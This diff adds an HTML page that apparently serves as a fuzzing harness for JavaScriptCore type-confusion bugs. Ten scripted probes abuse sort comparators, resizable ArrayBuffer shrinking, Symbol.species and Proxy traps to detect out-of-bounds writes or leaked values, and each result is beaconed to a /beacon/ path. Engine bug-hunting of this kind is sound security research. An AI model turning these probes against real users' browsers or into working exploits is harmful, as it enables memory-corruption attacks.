@@ -1,0 +1,167 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p805</title></head>
+<body><pre id="out">p805: JSC type confusion fuzzer</pre>
+<script>
+"use strict";
+var O=document.getElementById("out");
+function bk(t,d){O.textContent+="\n"+t+(d?"-"+d:"");try{new Image().src="/beacon/P805-"+encodeURIComponent(t+(d?"-"+d:""))+"?t="+Date.now();}catch(e){}}
+function f64hex(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;var u=new Uint32Array(b);return((u[1]>>>0).toString(16)).padStart(8,"0")+((u[0]>>>0).toString(16)).padStart(8,"0");}
+
+bk("START","");
+
+// T1: Array.sort — double array, comparator forces object transition
+bk("T1","sort type transition");
+try {
+  var trigger1 = false;
+  var arr1 = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+  arr1.sort(function(a, b) {
+    if (!trigger1 && a > 3) { trigger1 = true; arr1[0] = {}; }
+    return a - b;
+  });
+  var v = arr1[0];
+  if (typeof v === "number" && v !== v) bk("T1-NAN","type confusion!");
+  else if (typeof v === "number" && v > 100) bk("T1-LEAK","big number: "+f64hex(v));
+  else bk("T1-OK",typeof v+"="+String(v).slice(0,20));
+} catch(e) { bk("T1-ERR",e.message.slice(0,40)); }
+
+// T2: Array.splice with length-truncation in accessor
+bk("T2","splice+truncate");
+try {
+  var arr2 = [];
+  for(var i=0;i<20;i++) arr2.push(i+0.1);
+  var hit2=false;
+  Object.defineProperty(Array.prototype, "0", {
+    configurable:true,
+    get:function(){if(!hit2){hit2=true;arr2.length=1;}return 999;},
+    set:function(){}
+  });
+  var rem = arr2.splice(0,10);
+  delete Array.prototype[0];
+  bk("T2-REM","len="+rem.length+",last="+rem[rem.length-1]);
+  for(var j=0;j<rem.length;j++){
+    if(typeof rem[j]==="number"&&rem[j]!==999&&rem[j]>20){bk("T2-LEAK","["+j+"]="+f64hex(rem[j]));break;}
+  }
+  if(!hit2) bk("T2-MISS","accessor not hit");
+  else bk("T2-OK","clean");
+} catch(e) { bk("T2-ERR",e.message.slice(0,40)); delete Array.prototype[0]; }
+
+// T3: valueOf during TypedArray.set with RAB shrink
+bk("T3","TA.set valueOf+shrink");
+try {
+  var rab3 = new ArrayBuffer(256, {maxByteLength: 4096});
+  var f64a = new Float64Array(rab3);
+  for(var i=0;i<f64a.length;i++) f64a[i]=1.1*(i+1);
+  var evil3={valueOf:function(){rab3.resize(8);return 999.999;}};
+  try{f64a[16]=evil3;}catch(e2){}
+  rab3.resize(256);
+  bk("T3-POST","[16]="+f64a[16]+","+(f64a[16]===999.999?"OOB-WRITE!":"clean"));
+} catch(e) { bk("T3-ERR",e.message.slice(0,40)); }
+
+// T4: TypedArray.prototype.sort with valueOf resize
+bk("T4","TA.sort valueOf");
+try {
+  var rab4 = new ArrayBuffer(128, {maxByteLength: 512});
+  var ta4 = new Float64Array(rab4);
+  for(var i=0;i<ta4.length;i++) ta4[i]=Math.random()*1000;
+  var sortHit=0;
+  ta4.sort(function(a,b){
+    sortHit++;
+    if(sortHit===3) rab4.resize(16);
+    return a-b;
+  });
+  bk("T4-POST","sortHit="+sortHit+",len="+ta4.length);
+} catch(e) { bk("T4-"+((e.message||"").indexOf("detach")>=0?"DETACH":"ERR"),e.message.slice(0,50)); }
+
+// T5: Array.from on TypedArray with iterator + resize
+bk("T5","Array.from+resize");
+try {
+  var rab5 = new ArrayBuffer(128, {maxByteLength: 1024});
+  var src5 = new Float64Array(rab5);
+  for(var i=0;i<src5.length;i++) src5[i]=i+0.5;
+  var n5=0;
+  src5[Symbol.iterator]=function(){var idx=0;var self=this;return{next:function(){
+    n5++;if(n5===4)rab5.resize(8);
+    if(idx>=16)return{done:true};
+    try{return{value:self[idx++],done:false};}catch(e){return{value:-1,done:false};}
+  }};};
+  var res5=Array.from(src5);
+  bk("T5-RES","len="+res5.length+",vals="+res5.slice(0,6).join(",").slice(0,50));
+  for(var j=0;j<res5.length;j++){
+    if(res5[j]!==undefined&&res5[j]!==-1&&res5[j]!==(j+0.5)&&typeof res5[j]==="number"){
+      bk("T5-STALE","["+j+"]="+f64hex(res5[j]));break;
+    }
+  }
+} catch(e) { bk("T5-ERR",e.message.slice(0,40)); }
+
+// T6: Proxy species on Array.map returns TypedArray
+bk("T6","Proxy species->TA");
+try {
+  var arr6=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
+  arr6.constructor={[Symbol.species]:function(n){return new Float64Array(n);}};
+  var mapped=arr6.map(function(x){return x;});
+  bk("T6-TYPE",Object.prototype.toString.call(mapped));
+  if(mapped instanceof Float64Array){
+    for(var k=0;k<mapped.length;k++){
+      var buf=new ArrayBuffer(8);new Float64Array(buf)[0]=mapped[k];
+      var hi=new Uint32Array(buf)[1];
+      if(hi>0x7f000000||hi>0x10000000){bk("T6-SUSPICIOUS","["+k+"]="+f64hex(mapped[k]));break;}
+    }
+  }
+} catch(e) { bk("T6-ERR",e.message.slice(0,40)); }
+
+// T7: Atomics on non-SharedArrayBuffer
+bk("T7","Atomics non-SAB");
+try {
+  var i32=new Int32Array(new ArrayBuffer(32));
+  i32[0]=42;
+  var old=Atomics.load(i32,0);
+  Atomics.store(i32,0,99);
+  var cas=Atomics.compareExchange(i32,0,99,1337);
+  bk("T7-OK","load="+old+",cas="+cas+",final="+i32[0]);
+} catch(e) { bk("T7-THREW",e.message.slice(0,40)); }
+
+// T8: for-in enumeration with Proxy ownKeys returning extra
+bk("T8","for-in Proxy extra keys");
+try {
+  var obj8={a:1,b:2};
+  var p8=new Proxy(obj8,{
+    ownKeys:function(){return["a","b","c","d","e","__proto__"];},
+    getOwnPropertyDescriptor:function(t,k){
+      if(k==="__proto__")return{value:0xDEADBEEF,writable:true,enumerable:true,configurable:true};
+      return{value:t[k]||0xCAFE,writable:true,enumerable:true,configurable:true};
+    }
+  });
+  var r8=[];for(var k in p8)r8.push(k+"="+p8[k]);
+  bk("T8-RES",r8.join(","));
+} catch(e) { bk("T8-ERR",e.message.slice(0,40)); }
+
+// T9: String.replace with exec that returns wrong indices
+bk("T9","replace bad exec");
+try {
+  var re9={};
+  re9[Symbol.replace]=function(str,rep){
+    // Return replacement with OOB index
+    return str.slice(0,0)+rep+str.slice(1000); // slice past end
+  };
+  var r9="hello".replace(re9,"PWNED");
+  bk("T9-RES",r9+",len="+r9.length);
+} catch(e) { bk("T9-ERR",e.message.slice(0,40)); }
+
+// T10: WeakRef + FinalizationRegistry race
+bk("T10","WR+FR race");
+try {
+  var leaked10=[];
+  var fr10=new FinalizationRegistry(function(val){leaked10.push(val);});
+  for(var round=0;round<5;round++){
+    (function(){
+      var obj={data:new ArrayBuffer(256)};
+      new Uint8Array(obj.data).fill(0x41+round);
+      fr10.register(obj,"round"+round);
+    })();
+  }
+  // Force GC
+  for(var g=0;g<2000;g++) new ArrayBuffer(4096);
+  bk("T10-FR","collected="+leaked10.length+",vals="+leaked10.join(","));
+} catch(e) { bk("T10-ERR",e.message.slice(0,40)); }
+
+bk("DONE","");
+</script></body></html>
